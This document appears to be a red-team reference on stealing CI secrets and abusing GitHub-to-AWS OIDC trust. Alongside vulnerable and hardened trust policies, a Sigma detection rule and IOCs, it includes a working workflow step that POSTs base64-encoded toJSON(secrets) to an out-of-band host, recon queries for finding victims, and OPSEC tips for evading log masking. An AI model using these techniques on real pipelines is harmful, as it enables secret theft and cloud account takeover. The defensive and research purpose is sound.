# CI Secret Exfiltration & OIDC Cloud-Trust Abuse

ATT&CK: T1552.004 (Unsecured Credentials: Private Keys / CI secrets), T1078.004 (Valid Accounts:
Cloud Accounts), T1556 (Modify Authentication Process — federation trust) · CWE-522 (Insufficiently
Protected Credentials), CWE-1390 (Weak Authentication), CWE-863 (Incorrect Authorization), CWE-798
(Use of Hard-coded/Static Credentials).

## Theory / Mechanism

CI is where secrets live: registry tokens, signing keys, cloud creds, and a short-lived **OIDC** JWT
the runner can mint. Two attacker goals:

1. **Exfiltrate the secrets the pipeline already holds.** GitHub masks `secrets.*` as `***` in logs,
   but `${{ toJSON(secrets) }}` serializes the whole secret context; base64/double-base64 defeats the
   mask, and an OOB POST avoids the log entirely. `process.env` on the runner also exposes the
   `GITHUB_TOKEN`, `ACTIONS_RUNTIME_TOKEN`, and the OIDC request URL/token.
2. **Abuse OIDC federation to assume a cloud role with no stored key.** GitHub's OIDC provider issues
   a signed JWT whose `sub` claim encodes `repo:<org>/<repo>:<ref-type>:<ref>` (e.g.
   `repo:acme/app:ref:refs/heads/main` or `repo:acme/app:environment:prod`). A cloud IAM trust policy
   that validates only `aud` (or wildcards the wrong segment) lets *any* workflow assume the role.

### The OIDC sub-claim mint (inside a workflow with `id-token: write`)
```yaml
permissions: { id-token: write, contents: read }
# runner mints a JWT for any audience:
- run: |
    curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value
```

## OIDC trust-policy misconfigurations (the bugs to hunt)

1. **No `sub` condition (only `aud`).** *Every* repo on github.com that targets your account can
   assume the role. Most common finding (Tinder, Datadog).
2. **Wildcard in the wrong segment.** `repo:acme*:*` (wildcard bleeds into the **org** name) lets any
   org whose name starts `acme` assume it (Rezonate). `repo:acme/*` is over-broad (every repo,
   including forks landing in the org, dependabot branches).
3. **`StringEquals` used with a wildcard value** — never matches OR is mis-scoped; use `StringLike`.
4. **Trusting `pull_request` refs** — `sub` ending `:pull_request` means anyone who can open a PR
   (incl. external contributors on public repos) runs under that trust; never grant prod write to it.

### VULNERABLE vs HARDENED AWS trust policy
```json
// VULNERABLE: no sub, wildcard org bleed
{ "Effect":"Allow","Principal":{"Federated":"arn:aws:iam::ACCT:oidc-provider/token.actions.githubusercontent.com"},
  "Action":"sts:AssumeRoleWithWebIdentity",
  "Condition":{ "StringEquals":{"token.actions.githubusercontent.com:aud":"sts.amazonaws.com"},
                "StringLike":{"token.actions.githubusercontent.com:sub":"repo:acme*"} } }
```
```json
// HARDENED: exact repo + protected environment (preferred for prod)
{ "Effect":"Allow","Principal":{"Federated":"arn:aws:iam::ACCT:oidc-provider/token.actions.githubusercontent.com"},
  "Action":"sts:AssumeRoleWithWebIdentity",
  "Condition":{ "StringEquals":{
      "token.actions.githubusercontent.com:aud":"sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub":"repo:acme/app:environment:prod"} } }
```

## Working offensive techniques (authorized)

### A. Exfil the secret context from a poisoned pipeline (PPE/pwn request)
```yaml
- env: { ALL: '${{ toJSON(secrets) }}' }          # serialize secret context
  run: node -e 'require("https").request("https://OOB/s",{method:"POST"}).end(Buffer.from(process.env.ALL).toString("base64"))'
```

### B. Audit cloud trust policies for the OIDC bugs above
```bash
python3 scripts/oidc_trust_auditor.py --provider github --cloud aws --profile target
# Flags: roles trusting token.actions.githubusercontent.com with (a) no sub condition, (b) wildcard
# in the org segment, (c) StringEquals+wildcard, (d) :pull_request in sub, (e) repo:org/* breadth.
# --cloud gcp / azure parse the analogous WIF / federated-credential trust.
```

### C. Find candidate victims from public data (recon)
```bash
# Repos wiring GitHub OIDC to AWS/GCP reveal the target role ARN / account in plaintext workflow
gh search code 'aws-actions/configure-aws-credentials role-to-assume' --json repository,path
gh search code 'permissions: id-token: write' --json repository,path
```

### D. Assume a mis-scoped role from your own controlled repo
If the target role trusts `repo:victim*` (org bleed) or has no `sub`, create a repo whose namespace
satisfies the pattern, mint the OIDC token (snippet above) and call
`aws sts assume-role-with-web-identity --role-arn … --web-identity-token <jwt>`.

## Modern 2024-2026 variants (verified)

- **GhostAction (Sep 5 2025).** 327 GitHub accounts hijacked; malicious workflows injected into 817
  repos exfiltrated **3,325 secrets** (AWS keys, PyPI/npm/DockerHub tokens) via HTTP POST to attacker
  endpoints — the canonical mass secret-exfil-via-injected-workflow campaign.
- **AWS auto-block of vulnerable OIDC trust policies (Jun 2025).** AWS now blocks *creating* roles
  with a missing/over-broad GitHub-OIDC `sub` condition — but **legacy roles created earlier are not
  retroactively fixed** and must be audited manually.
- **Datadog / Tinder / Rezonate research (2024-2025).** Confirmed widespread missing-`sub` and
  org-wildcard misconfigurations across public orgs and even a UK government AWS account; CloudTrail
  attributes a successful assume to `repo:org/repo:ref` in the `userName`.
- **`shai-hulud-workflow.yml` (2025).** The npm worm's injected workflow exfiltrates
  `${{ toJSON(secrets) }}` (double-base64) to `webhook.site` — `toJSON(secrets)` exfil seen in the wild.

## Detection

**Static scan for the secret-context exfil sink:**
```bash
grep -RInE 'toJSON\(\s*secrets\s*\)' .github/workflows/    # any toJSON(secrets) = high signal
```

**Sigma — CloudTrail: role assumed by a federated GitHub identity outside the allowlist:**
```yaml
title: GitHub OIDC AssumeRole From Unexpected Repository
id: c4e1a902-77bd-4a55-9f33-cicdoidc0001
logsource: { product: aws, service: cloudtrail }
detection:
  sel:
    eventName: 'AssumeRoleWithWebIdentity'
    'userIdentity.identityProvider'|contains: 'token.actions.githubusercontent.com'
  filter_known:
    'requestParameters.roleArn'|contains: 'arn:aws:iam::ACCT:role/gha-'
    'responseElements.assumedRoleUser.arn'|contains: 'repo:acme/'
  condition: sel and not filter_known
level: high
```

**Tooling:** IAM Access Analyzer external-access findings filtered to Federated principals; any role
whose `sub` matches more than one repo/ref pair is a narrowing candidate. Egress allowlist via
`step-security/harden-runner` to catch the POST.

**IOCs:** `toJSON(secrets)` or `${{ secrets }}` JSON in a `run:`/`env:`; CloudTrail
`AssumeRoleWithWebIdentity` with a `sub` not on your allowlist; outbound POST to webhook/OOB host from
a runner; trust policies with no `sub` / `StringLike repo:org*` / `:pull_request`.

## OPSEC

- Touches: build log (masked but bypassable), runner egress, GitHub audit log, **CloudTrail** (the
  assume is logged and attributed to `repo:org/repo:ref`). OIDC creds are short-lived but fully traced.
- Cleanup: nothing to clean on an ephemeral runner; you cannot remove CloudTrail/audit entries. Rotate
  nothing — exfiltrated secrets stay valid until the victim rotates, so timing matters.
- Evasion: double-base64 to beat `***` masking; exfil OOB not to stdout; use OIDC (no stored key to
  steal, short-lived) so there's no long-lived secret to alert on — but the assume *is* logged. Prefer
  abusing an existing over-broad role over creating new IAM artifacts.

## References

- Tinder Tech Blog, "Identifying vulnerabilities in GitHub Actions & AWS OIDC Configurations."
- Datadog Security Labs, "No keys attached: Exploring GitHub-to-AWS keyless authentication flaws."
- Rezonate, "From GitHub To Account Takeover: Misconfigured Actions Place GCP & AWS Accounts At Risk."
- Cloud Security Partners / CloudUpload, hardening GitHub Actions OIDC trust policies on AWS.
- GitGuardian, "GhostAction" campaign disclosure (Sep 2025); AWS June 2025 trust-policy block.
- GitHub Docs, "About security hardening with OpenID Connect" (sub-claim format).
